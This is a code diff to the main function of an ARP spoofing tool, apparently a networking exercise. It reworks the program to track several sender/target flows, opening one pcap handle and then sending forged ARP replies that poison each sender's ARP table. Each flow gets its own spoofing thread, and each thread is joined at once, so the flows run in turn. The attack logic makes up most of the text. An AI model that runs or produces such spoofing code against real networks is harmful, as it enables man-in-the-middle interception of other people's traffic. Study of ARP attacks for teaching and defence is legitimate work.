@@ -2,7 +2,10 @@
 
 int main(int argc, char *argv[])
 {
-	Flow flow;
+	std::vector<Flow> flowList;
+
+	// set interface for flows
+	const char *interfaceName = argv[1];
 
 	// parameter check
 	if (argc < 4 || (argc % 2) != 0)
@@ -10,26 +13,28 @@ int main(int argc, char *argv[])
 		usage();
 		return -1;
 	}
+
+	// Open pcap handle
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t *handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1, errbuf);
+	if (handle == nullptr)
+	{
+		fprintf(stderr, "couldn't open device %s(%s)\n", interfaceName, errbuf);
+		return -1;
+	}
+
 	// for multiple execution
 	int iter;
-	for (iter = 2; iter <= argc - 1; iter += 2)
+	for (iter = 2; iter < argc; iter += 2)
 	{
+		Flow flow;
+
 		printf("\n----------------------------------------\n");
 		printf("[*] arp-spoof #%d..", iter / 2);
 		printf("\n----------------------------------------\n");
 
-		flow.interfaceName = argv[1];
+		getHostInfo(interfaceName, &flow.attackerIp, &flow.attackerMac);
 
-		getHostInfo(flow.interfaceName, &flow.attackerIp, &flow.attackerMac);
-
-		// Open pcap handle
-		char errbuf[PCAP_ERRBUF_SIZE];
-		pcap_t *handle = pcap_open_live(flow.interfaceName, BUFSIZ, 1, 1, errbuf);
-		if (handle == nullptr)
-		{
-			fprintf(stderr, "couldn't open device %s(%s)\n", flow.interfaceName, errbuf);
-			return -1;
-		}
 		printf("\n----------------------------------------\n");
 		printf("[*] get sender Info..");
 		printf("\n----------------------------------------\n");
@@ -48,15 +53,21 @@ int main(int argc, char *argv[])
 		printf("[+] targetIp    : %s\n", std::string(flow.targetIp).c_str());
 		printf("[+] targetMac   : %s\n", std::string(flow.targetMac).c_str());
 
+		flowList.push_back(flow);
+	}
+	for (int i = 0; i < flowList.size(); i++)
+	{
 		// Send ARP Reply packet to infect sender's ARP table
-		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, flow.senderMac, flow.attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, flow.attackerMac, flow.targetIp, flow.senderMac, flow.senderIp);
+		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, flowList[i].senderMac, flowList[i].attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, flowList[i].attackerMac, flowList[i].targetIp, flowList[i].senderMac, flowList[i].senderIp);
 		sendArp(handle, pkt);
 
-		while (true)
+		std::thread spoofProcessThread(spoofProcess, ArpHdr::Reply, handle, pkt, flowList[i]);
+		// spoofProcess(ArpHdr::Reply, handle, pkt, flowList[i]);
+		// printf("here?\n");
+		if (true)
 		{
-			spoofProcess(ArpHdr::Reply, handle, pkt, flow);
+			spoofProcessThread.join();
 		}
-
-		pcap_close(handle);
 	}
+	pcap_close(handle);
 }
